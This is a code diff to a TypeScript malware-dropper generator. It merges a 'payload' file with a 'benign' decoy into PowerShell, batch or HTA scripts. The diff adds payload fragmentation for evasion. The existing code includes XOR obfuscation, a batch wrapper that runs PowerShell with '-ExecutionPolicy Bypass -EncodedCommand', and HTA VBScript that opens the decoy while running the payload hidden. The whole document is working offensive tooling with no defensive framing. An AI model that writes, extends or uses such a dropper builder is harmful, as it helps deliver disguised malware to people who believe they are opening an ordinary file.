@@ -16,8 +16,9 @@ const EncryptionSchema = z.object({
 const MergePayloadsInputSchema = z.object({
   payload: FileInputSchema,
   benign: FileInputSchema,
-  outputFormat: z.enum(['ps1', 'bat', 'hta', 'js', 'vbs']),
+  outputFormat: z.enum(['ps1', 'bat', 'hta']),
   encryption: EncryptionSchema.optional(),
+  useFragmentation: z.boolean().optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -46,24 +47,35 @@ function xorEncrypt(data: string, key: string): string {
     return result;
 }
 
-const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string, encryption?: z.infer<typeof EncryptionSchema>): string => {
+const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string, encryption?: z.infer<typeof EncryptionSchema>, useFragmentation?: boolean): string => {
     
-    let payloadSection = `$payloadFileBytes = [System.Convert]::FromBase64String(@"
+    let payloadSection: string;
+
+    if (useFragmentation) {
+        const chunkSize = 1000;
+        const chunks = [];
+        for (let i = 0; i < payloadBase64.length; i += chunkSize) {
+            chunks.push(payloadBase64.substring(i, i + chunkSize));
+        }
+        const chunkString = chunks.map(c => `@"${c}"@`).join(',');
+        payloadSection = `$payloadChunks = ${chunkString}\n$payloadBase64 = $payloadChunks -join ''`;
+    } else {
+        payloadSection = `$payloadBase64 = @"
 ${payloadBase64}
-"@)`;
+"@`;
+    }
 
     if (encryption && encryption.type === 'xor') {
-        payloadSection = `
-$encryptedBase64 = @"
-${payloadBase64}
-"@
+        payloadSection += `
 $key = "${encryption.key}"
-$encryptedBytes = [System.Convert]::FromBase64String($encryptedBase64)
+$encryptedBytes = [System.Convert]::FromBase64String($payloadBase64)
 $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
 $payloadFileBytes = New-Object byte[] $encryptedBytes.Length
 for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
     $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
 }`;
+    } else {
+        payloadSection += `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadBase64)`;
     }
     
     return `
@@ -97,7 +109,7 @@ ${benignBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payload, benign, outputFormat, encryption } = validatedInput;
+    const { payload, benign, outputFormat, encryption, useFragmentation } = validatedInput;
 
     let payloadBase64 = decodeDataUri(payload.content);
     const benignBase64 = decodeDataUri(benign.content);
@@ -113,22 +125,32 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
+            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption, useFragmentation);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
+            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption, useFragmentation);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
 
         case 'hta':
-             let vbsPayloadSection = `payloadB64 = "${payloadBase64}"
-                Call Base64ToFile(payloadB64, payloadFilePath)`;
+            let payloadProcessingSection: string;
+
+            if (useFragmentation) {
+                const chunkSize = 500;
+                const chunks = [];
+                for (let i = 0; i < payloadBase64.length; i += chunkSize) {
+                    chunks.push(payloadBase64.substring(i, i + chunkSize));
+                }
+                const chunkString = chunks.map(c => `"${c}"`).join(" & ");
+                payloadProcessingSection = `payloadB64 = ${chunkString}`;
+            } else {
+                payloadProcessingSection = `payloadB64 = "${payloadBase64}"`;
+            }
 
             if (encryption && encryption.type === 'xor') {
-                vbsPayloadSection = `
-                encryptedB64 = "${payloadBase64}"
+                payloadProcessingSection += `
                 key = "${encryption.key}"
                 
                 ' Decrypt the payload
@@ -136,7 +158,7 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 Set oXML = CreateObject("MSXML2.DOMDocument")
                 Set oNode = oXML.CreateElement("base64")
                 oNode.DataType = "bin.base64"
-                oNode.Text = encryptedB64
+                oNode.Text = payloadB64
                 encryptedBytes = oNode.NodeTypedValue
                 
                 keyBytes = StrToBytes(key)
@@ -154,6 +176,9 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                     .Close
                 End With
                 `;
+            } else {
+                 payloadProcessingSection += `
+                Call Base64ToFile(payloadB64, payloadFilePath)`;
             }
 
             const vbsPayload = `
@@ -167,7 +192,7 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 benignB64 = "${benignBase64}"
                 Call Base64ToFile(benignB64, benignFilePath)
 
-                ${vbsPayloadSection}
+                ${payloadProcessingSection}
                 
                 objShell.Run "cmd /c """ & benignFilePath & """", 0, True
                 objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden
@@ -201,15 +226,6 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
             `;
             scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
             break;
-
-        case 'js':
-        case 'vbs':
-            // These require more complex dropper logic using WScript.Shell
-            // For now, return an error that it's not implemented yet.
-             return {
-              success: false,
-              error: `Output format '${outputFormat}' is not yet fully supported for standalone script generation.`,
-            };
 
         default:
              return { success: false, error: 'Invalid or unsupported output format.' };
